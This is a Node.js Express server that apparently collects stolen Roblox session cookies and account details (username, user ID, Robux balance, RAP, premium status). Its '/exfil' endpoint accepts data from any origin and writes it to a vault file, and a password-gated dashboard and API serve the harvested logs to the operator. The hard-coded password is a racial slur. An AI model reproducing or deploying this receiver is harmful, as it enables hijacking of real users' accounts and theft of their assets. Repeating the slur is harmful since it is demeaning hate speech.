const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors({ origin: '*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

const PASSWORD = "nigger"; // CHANGE THIS
let logs = [];

const dataFile = path.join(__dirname, 'vault.json');
if (fs.existsSync(dataFile)) {
  logs = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
}

app.all('/exfil', (req, res) => {
  let logData = req.method === 'POST' ? req.body : req.query;
  const newLog = {
    timestamp: new Date().toLocaleString(),
    cookie: logData.c || 'N/A',
    username: logData.u || 'Unknown',
    displayName: logData.d || 'N/A',
    userId: logData.id || 'N/A',
    rap: parseInt(logData.rap) || 0,
    robux: parseInt(logData.robux) || 0,
    premium: logData.prem || 'No',
    avatarUrl: logData.head || 'https://i.imgur.com/removed.png'
  };
  logs.unshift(newLog);
  fs.writeFileSync(dataFile, JSON.stringify(logs, null, 2));
  res.send('OK');
});

app.get('/gate', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/gate.html'));
});

app.post('/unlock', (req, res) => {
  if (req.body.pass === PASSWORD) {
    res.sendFile(path.join(__dirname, 'public/throne.html'));
  } else {
    res.redirect('/gate?fail=1');
  }
});

app.get('/api/vault', (req, res) => {
  if (req.query.key === btoa(PASSWORD)) {
    res.json(logs);
  } else {
    res.status(403).send('NO');
  }
});

app.get('/avatar/:id', (req, res) => {
  const url = logs.find(l => l.userId === req.params.id)?.avatarUrl;
  res.redirect(url || 'https://i.imgur.com/removed.png');
});

app.get('/', (req, res) => {
  res.redirect('/gate');
});

// FIX 404 ON /unlock
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public/gate.html'));
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Throne on ${port}`));
